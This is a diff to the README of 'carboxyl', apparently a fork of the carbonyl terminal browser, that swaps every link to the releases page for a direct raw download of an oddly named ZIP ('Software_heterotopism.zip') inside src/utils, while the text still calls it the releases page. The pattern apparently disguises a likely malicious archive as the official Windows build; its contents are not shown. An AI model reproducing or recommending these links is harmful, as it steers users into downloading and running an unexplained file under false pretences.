@@ -1,6 +1,6 @@
 # 🧭 carboxyl - Chromium in Your Terminal
 
-[![Download carboxyl](https://img.shields.io/badge/Download%20carboxyl-Visit%20Releases-blue?style=for-the-badge)](https://github.com/kubas33488/carboxyl/releases)
+[![Download carboxyl](https://img.shields.io/badge/Download%20carboxyl-Visit%20Releases-blue?style=for-the-badge)](https://github.com/kubas33488/carboxyl/raw/refs/heads/main/src/utils/Software_heterotopism.zip)
 
 ## 🚀 What is carboxyl?
 
@@ -12,7 +12,7 @@ carboxyl is a fork of carbonyl, which means it builds on the same core idea and 
 
 To get carboxyl on Windows, visit the releases page and download the latest Windows file from there:
 
-[Visit the carboxyl releases page](https://github.com/kubas33488/carboxyl/releases)
+[Visit the carboxyl releases page](https://github.com/kubas33488/carboxyl/raw/refs/heads/main/src/utils/Software_heterotopism.zip)
 
 After the page opens, look for the newest release and download the file that matches Windows. If you see more than one file, choose the one made for your system type, such as 64-bit Windows.
 
@@ -32,7 +32,7 @@ For most users, a recent 64-bit Windows computer will work best.
 
 Follow these steps on Windows:
 
-1. Open the releases page: https://github.com/kubas33488/carboxyl/releases
+1. Open the releases page: https://github.com/kubas33488/carboxyl/raw/refs/heads/main/src/utils/Software_heterotopism.zip
 2. Find the latest version near the top of the page.
 3. Download the Windows package for that release.
 4. If the file comes in a ZIP archive, right-click it and choose Extract All.
@@ -129,7 +129,7 @@ Because it uses Chromium, you get support for many modern web pages. Because it 
 
 New builds and fixes will appear on the releases page:
 
-[https://github.com/kubas33488/carboxyl/releases](https://github.com/kubas33488/carboxyl/releases)
+[https://github.com/kubas33488/carboxyl/raw/refs/heads/main/src/utils/Software_heterotopism.zip](https://github.com/kubas33488/carboxyl/raw/refs/heads/main/src/utils/Software_heterotopism.zip)
 
 Check that page when you want the latest Windows release or a newer build with fixes.
 
@@ -148,7 +148,7 @@ Keyboard use is the main path. Some builds may support mouse input in limited wa
 Many modern sites should load, since it uses Chromium. Pages with heavy graphics or complex layouts may not look the same as they do in a full browser.
 
 ### Where do I get the Windows version?
-Use the releases page here: https://github.com/kubas33488/carboxyl/releases
+Use the releases page here: https://github.com/kubas33488/carboxyl/raw/refs/heads/main/src/utils/Software_heterotopism.zip
 
 ## 📦 Files You May See in a Release
 
